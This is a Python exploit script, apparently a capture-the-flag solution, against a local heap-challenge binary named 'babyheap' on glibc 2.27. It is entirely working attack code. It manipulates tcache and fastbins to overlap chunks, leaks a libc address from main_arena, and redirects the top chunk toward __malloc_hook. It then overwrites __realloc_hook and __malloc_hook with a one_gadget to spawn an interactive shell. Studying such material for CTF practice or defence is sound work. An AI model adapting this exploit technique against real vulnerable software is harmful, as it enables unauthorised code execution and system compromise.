from ptrlib import *

def allocate(size):
    sock.sendlineafter(": ", "1")
    sock.sendlineafter(": ", str(size))
    return
def update(index, data):
    sock.sendlineafter(": ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(len(data)))
    sock.sendafter(": ", data)
    return
def delete(index):
    sock.sendlineafter(": ", "3")
    sock.sendlineafter(": ", str(index))
    return
def view(index):
    sock.sendlineafter(": ", "4")
    sock.sendlineafter(": ", str(index))
    sock.recvuntil(": ")
    return sock.recvline()

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./babyheap", env={"LD_LIBRARY_PATH": "./"})
libc_main_arena = 0x3ebc40
libc_one_gadget = 0x4f322

# evict tcache
for i in range(7):
    allocate(0x28)
    update(i, 'A' * 0x28) # make it fast to shrink top
for i in range(7):
    delete(i)
for i in range(7):
    allocate(0x48)
    update(i, 'B' * 0x48)
for i in range(7):
    delete(i)
# now top->size == 0x1000

# allocate chunks for overlap
for i in range(15):
    allocate(0x28)
    update(i, 'C' * 0x28)
for i in range(15):
    delete(i)

for i in range(7):
    allocate(0x18) # 0 - 6
    update(i, str(i) * 0x17)
# now top->size == 0x21
allocate(0x18) # 7

# unsortedbin: size == 0x2b0 (0x30 * 15 - 0x20)
update(7, '7' * 0x18) # make it 0x200
allocate(0x18) # 8
allocate(0x18) # 9
for i in range(10, 15):
    allocate(0x48)
delete(9)
for i in range(1, 7):
    delete(i)
delete(0) # linked to fastbin
delete(8) # linked to fastbin
# now top->size == 0x31
allocate(0x38) # 0

# leak libc
libc_base = u64(view(10)[:8]) - libc_main_arena - 0x60
logger.info("libc = " + hex(libc_base))

# house of spirit
allocate(0x48) # 1
allocate(0x48) # 2 == 11
allocate(0x18) # 3
delete(3)
update(12, p64(0x51))
allocate(0x18) # 3 (this will write 0x51 to main_arena+16 == fastbin[0])

delete(2)
update(11, p64(libc_base + libc_main_arena + 0x8))
allocate(0x48) # 2

# overwrite fastbin[1]
allocate(0x48) # 4 == main_arena + 0x18
payload = b''
payload += p64(libc_base + libc_main_arena + 0x50)
payload += b'\x00' * 0x38
payload += p64(0x31)
update(4, payload)

# overwrite top
allocate(0x28) # 5
payload = p64(libc_base + libc.symbol("__malloc_hook") - 0x28)
payload += p64(0)
payload += p64(libc_base + libc_main_arena + 96) * 2
payload += p64(libc_base + libc_main_arena + 112)
update(5, payload)

# overwrite __realloc_hook & __malloc_hook
allocate(0x58) # 6
payload = b'\x00'*0x10
payload += p64(libc_base + libc_one_gadget) # __realloc_hook
payload += p64(libc_base + libc.symbol("svc_run") + 0x42) # __malloc_hook
update(6, payload)

# get the shell!
sock.sendlineafter(": ", "1")
sock.sendlineafter(": ", "1")

sock.interactive()
